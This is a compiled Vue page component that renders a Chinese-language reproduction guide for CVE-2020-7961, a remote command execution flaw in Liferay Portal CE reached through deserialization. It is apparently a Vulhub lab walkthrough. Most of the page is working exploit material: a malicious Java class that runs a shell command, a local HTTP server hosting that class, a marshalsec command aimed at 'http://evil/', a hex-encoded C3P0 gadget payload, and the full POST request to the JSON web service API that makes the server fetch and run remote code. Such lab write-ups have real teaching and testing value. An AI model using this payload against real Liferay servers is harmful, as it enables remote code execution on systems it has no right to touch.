import{_ as c}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as i,c as l,a as e,b as a,d as s,e as t}from"./app-58e4a7d6.js";const p={},r=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),a(" 漏洞描述")],-1),d=e("p",null,"Liferay Portal CE是一款用来快速构建网站的开源系统。其7.2.0 GA1及以前的版本API接口中存在一处反序列化漏洞，利用该漏洞可在目标服务器上执行任意命令。",-1),u=e("p",null,"参考链接：",-1),f={href:"https://codewhitesec.blogspot.com/2020/03/liferay-portal-json-vulns.html",target:"_blank",rel:"noopener noreferrer"},m={href:"https://jianfensec.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Liferay%20Portal%20CVE-2020-7961%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/",target:"_blank",rel:"noopener noreferrer"},v={href:"https://jianfensec.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Liferay",target:"_blank",rel:"noopener noreferrer"},b={href:"https://xz.aliyun.com/t/7499",target:"_blank",rel:"noopener noreferrer"},h={href:"https://xz.aliyun.com/t/7485",target:"_blank",rel:"noopener noreferrer"},k=t(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub执行如下命令启动Liferay Portal 7.2.0 GA1：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>启动成功后，访问<code>http://your-ip:8080</code>即可查看到默认首页。如果环境一直没有成功启动，可能是内存不足，请使用至少2G内存的服务器运行这个环境。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>首先准备一个恶意的Java类，编译：</p><div class="language-java line-numbers-mode" data-ext="java"><pre class="language-java"><code><span class="token comment">// javac LifExp.java</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LifExp</span> <span class="token punctuation">{</span>

<span class="token keyword">static</span> <span class="token punctuation">{</span>
    <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> cmd <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&quot;bash&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;-c&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;touch /tmp/success&quot;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
            <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">waitFor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span> <span class="token class-name">Exception</span> e <span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>在保存着class文件的目录下运行一个HTTP文件服务：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>$ ls
LifExp.class  LifExp.java

$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,9),g={href:"https://github.com/mbechler/marshalsec",target:"_blank",rel:"noopener noreferrer"},_=t(`<div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Jackson C3P0WrapperConnPool http://evil/ LifExp
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>其中，<code>http://evil/</code>是刚才启动的保存了恶意class文件的Web服务，LifExp是恶意类名。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202262103386.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>生成的Payload是Jackson使用的，我们只需按照Liferay Portal的形式，即<code>+参数名:类名=值</code>，来修改这个Payload：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>+defaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource={&quot;userOverridesAsString&quot;:&quot;HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400064c6966457870740017687474703a2f2f3139322e3136382e3137342e3132382f740003466f6f;&quot;}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>将上述Payload合并到HTTP请求中发送：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /api/jsonws/invoke HTTP/1.1
Host: your-ip:8080
Content-Length: 1346
Content-Type: application/x-www-form-urlencoded
Connection: close

cmd=%7B%22%2Fexpandocolumn%2Fadd-column%22%3A%7B%7D%7D&amp;p_auth=o3lt8q1F&amp;formDate=1585270368703&amp;tableId=1&amp;name=2&amp;type=3&amp;%2BdefaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource={&quot;userOverridesAsString&quot;:&quot;HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400064c6966457870740017687474703a2f2f3137322e31372e302e313a383030302f740003466f6f;&quot;}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202262106194.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202262106835.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,9);function x(E,y){const n=o("ExternalLinkIcon");return i(),l("div",null,[r,d,u,e("ul",null,[e("li",null,[e("a",f,[a("https://codewhitesec.blogspot.com/2020/03/liferay-portal-json-vulns.html"),s(n)])]),e("li",null,[a("["),e("a",m,[a("https://jianfensec.com/漏洞复现/Liferay Portal CVE-2020-7961 学习记录/"),s(n)]),a("]("),e("a",v,[a("https://jianfensec.com/漏洞复现/Liferay"),s(n)]),a(" Portal CVE-2020-7961 学习记录/)")]),e("li",null,[e("a",b,[a("https://xz.aliyun.com/t/7499"),s(n)])]),e("li",null,[e("a",h,[a("https://xz.aliyun.com/t/7485"),s(n)])])]),k,e("p",null,[a("因为目标Java版本较高，我们使用利用链是com.mchange.v2.c3p0.WrapperConnectionPoolDataSource，借助"),e("a",g,[a("marshalsec"),s(n)]),a("来生成一个适用于Jackson的POC：")]),_])}const L=c(p,[["render",x],["__file","Liferay Portal CE 反序列化命令执行漏洞 CVE-2020-7961.html.vue"]]);export{L as default};
